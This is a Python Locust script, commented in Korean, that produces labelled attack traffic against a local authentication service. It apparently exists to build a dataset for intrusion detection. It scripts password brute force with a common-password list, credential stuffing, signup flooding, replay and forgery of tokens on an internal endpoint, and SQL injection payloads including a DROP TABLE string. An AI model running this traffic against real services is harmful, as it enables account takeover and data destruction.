# attack_auth_locustfile.py — auth-service 공격 트래픽 (A1~A5, attack.md 기준)
#
# 실행:
#   locust -f attacks/attack_auth_locustfile.py --host http://localhost:8080 \
#          --users 10 --spawn-rate 5 --run-time 120s --headless
#
# 라벨: 캡처 시간창 전체를 malicious 로 라벨(공격은 4xx가 나도 정상 — 의도 기준).
# 시퀀스 효과: A1/A2 ★★★(버스트), A3/A4 ★★☆, A5 ★☆☆(페이로드형).

import os
import uuid
import random
import logging

from locust import HttpUser, task, between

logger = logging.getLogger(__name__)

# 브루트포스용 소형 패스워드 사전(트래픽 생성용)
PASSWORD_LIST = [
    "123456", "password", "admin", "qwerty", "111111", "root", "test1234",
    "letmein", "welcome", "changeme", "P@ssw0rd", "abc123",
]
# SQLi 페이로드(JPA라 실행 안 되지만 요청 바이트가 라벨 대상)
SQLI = [
    "' OR '1'='1", "admin'--", "' UNION SELECT NULL--",
    "1' OR '1'='1' -- ", "'; DROP TABLE users;--", "\" OR \"\"=\"",
]


def hit(cm):
    """attack 트래픽: 4xx여도 실패로 세지 않고 success 처리(의도 기준 라벨)."""
    with cm as r:
        r.success()


class AuthAttacker(HttpUser):
    host = os.environ.get("HOST", "http://localhost:8080")
    wait_time = between(0.05, 0.3)  # 버스트에 가깝되 과하지 않게

    def on_start(self):
        # 브루트포스 표적이 될 '실존 계정' 하나 생성 + 유효 토큰 확보(A4 재생용)
        self._victim = f"victim_{uuid.uuid4().hex[:8]}"
        self._victim_pw = "Victim@12345!"
        self.client.post("/api/auth/signup", json={
            "username": self._victim, "email": f"{self._victim}@t.local",
            "password": self._victim_pw,
        }, name="/api/auth/signup [setup]")
        self._valid_token = None
        with self.client.post("/api/auth/login", json={
            "username": self._victim, "password": self._victim_pw,
        }, name="/api/auth/login [setup]", catch_response=True) as r:
            r.success()
            try:
                self._valid_token = r.json().get("accessToken")
            except Exception:
                pass

    # A1 — 크리덴셜 브루트포스 (고정 username, 패스워드 사전 난타) ★★★
    @task(3)
    def a1_brute_force(self):
        hit(self.client.post("/api/auth/login", json={
            "username": self._victim, "password": random.choice(PASSWORD_LIST),
        }, name="A1 login[brute]", catch_response=True))

    # A2 — 크리덴셜 스터핑 (user/pass 쌍 순회) ★★★
    @task(2)
    def a2_cred_stuffing(self):
        hit(self.client.post("/api/auth/login", json={
            "username": f"user_{uuid.uuid4().hex[:6]}",
            "password": random.choice(PASSWORD_LIST),
        }, name="A2 login[stuffing]", catch_response=True))

    # A3 — 계정 farming(가입 폭주) ★★☆
    @task(1)
    def a3_signup_flood(self):
        u = f"bot_{uuid.uuid4().hex[:10]}"
        hit(self.client.post("/api/auth/signup", json={
            "username": u, "email": f"{u}@t.local", "password": "Bot@12345!",
        }, name="A3 signup[flood]", catch_response=True))

    # A4 — 내부신뢰 엔드포인트 악용(외부→internal validate) + 토큰 재생/위조 ★★☆
    @task(2)
    def a4_internal_trust_abuse(self):
        # 절반은 탈취 토큰 재생, 절반은 위조/garbage 토큰
        if self._valid_token and random.random() < 0.5:
            token = self._valid_token
        else:
            token = "eyJhbGciOiJIUzI1NiJ9." + uuid.uuid4().hex + ".forged"
        hit(self.client.get("/internal/auth/validate",
                            headers={"Authorization": f"Bearer {token}"},
                            name="A4 internal/validate[abuse]", catch_response=True))

    # A5 — 로그인 SQLi 페이로드 ★☆☆(페이로드형)
    @task(1)
    def a5_sqli(self):
        hit(self.client.post("/api/auth/login", json={
            "username": random.choice(SQLI), "password": random.choice(SQLI),
        }, name="A5 login[sqli]", catch_response=True))
